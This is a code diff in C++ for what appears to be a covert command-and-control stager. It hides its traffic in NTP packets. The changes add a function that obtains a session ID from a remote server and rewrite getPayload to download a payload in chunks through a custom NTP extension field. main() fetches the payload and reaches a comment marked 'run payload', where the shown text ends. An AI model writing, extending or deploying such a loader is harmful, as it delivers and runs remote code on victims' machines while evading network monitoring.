@@ -110,21 +110,93 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 /*
 * helper to get payload 
 */
-std::vector<uint8_t> getPayload() {
+std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
 	//Create pcaket
 	auto packet = NTPPacket();
 	//packet.printPacket();
 	std::vector<uint8_t> packetData = { 0x86 }; //packetData on giveMePayload asks for arch?
+	std::vector<uint8_t> zeroPacketData = { 0x00 }; //packetData on giveMePayload asks for arch?
 
 	//Chunking here to get the payload
 	//response from serer will be size, so need to get size, and chunk over that, and insert into payloadBuffer
-	std::vector<uint8_t> payloadBuffer = chunker(
-		packetData,
+	//probably shoudln't use chunker here, or at least modify chunker to be a send only mechanism? I dunno
+	//std::vector<uint8_t> payloadBuffer = chunker(
+	//	packetData,
+	//	NtpExtensionField::giveMePayload,
+	//	Client::emptySessionId
+	//);
+	// 
+	// 
+	// 
+
+	//modified way of doing this.
+
+	//temp session id
+
+	//1. Send a NtpExtensionField::giveMePayload packet. This returns size of inbound payload
+	NTPPacket giveMePayloadPacketClass;
+	giveMePayloadPacketClass.addExtensionField(
 		NtpExtensionField::giveMePayload,
-		Client::emptySessionId
+		packetData,
+		sessionId //placeholder until real id
+
 	);
+	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
+	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);
+
+	uint32_t payloadSize = 0;
+	std::memcpy(&payloadSize, responsePacket.data(), sizeof(payloadSize));
+
+	//2. Iterate over size, and send a 0x00 (NtpExtensionField::giveMePayload) packet, until all data has been recieved.
+
+	//create our packet first so we don't have to keep re-creating it
+	NTPPacket getMoreOfPayloadPacketClass;
+	getMoreOfPayloadPacketClass.addExtensionField(
+		NtpExtensionField::giveMePayload,
+		zeroPacketData,
+		sessionId //placeholder until real id
+	);
+	std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
+
+	std::vector<uint8_t> payloadBuffer;
+	while (payloadBuffer.size() < payloadSize) {
+		//send chunk and get data out of it
+		std::vector<uint8_t> responsePacket = sendChunk(getMoreOfPayloadPacket);
+
+		//parse
+		NTPPacketParser parsedPacketClass(responsePacket);
+		std::vector<uint8_t> extensionData = parsedPacketClass.getExtensionData();
+
+		//add data to vector
+		payloadBuffer.insert(payloadBuffer.end(), extensionData.begin(), extensionData.end());
+
+	}
+
+	//3. This should now be the payload data. 
+
 
 	return payloadBuffer;
+}
+
+std::vector<uint8_t> getId() {
+	std::cout << "[?] Getting Session ID" << std::endl;
+	std::vector<uint8_t> packetData = {}; //empty cuz it doesn't need anything
+
+	NTPPacket giveMePayloadPacketClass;
+	giveMePayloadPacketClass.addExtensionField(
+		NtpExtensionField::getIdPacket,
+		packetData,
+		Client::emptySessionId
+	);
+	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
+	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);
+
+	NTPPacketParser responsePacketParser = NTPPacketParser(responsePacket);
+	//Get extension data:
+	std::vector<uint8_t> extensionData = responsePacketParser.getExtensionSessionId();
+
+
+	return extensionData;
 }
 
 int main() {
@@ -132,8 +204,13 @@ int main() {
 
 	std::cout << "Started" << std::endl;
 
+	//0. Get Session ID from server
+	//std::cout << "[?] Session ID: ";
+	//printHexVector(getId());
+	std::vector<uint8_t> sessionId = getId();
+
 	//1. Get Payload
-	std::vector<uint8_t> payloadBytes = getPayload();
+	std::vector<uint8_t> payloadBytes = getPayload(sessionId);
 
 	//2. run payload
 
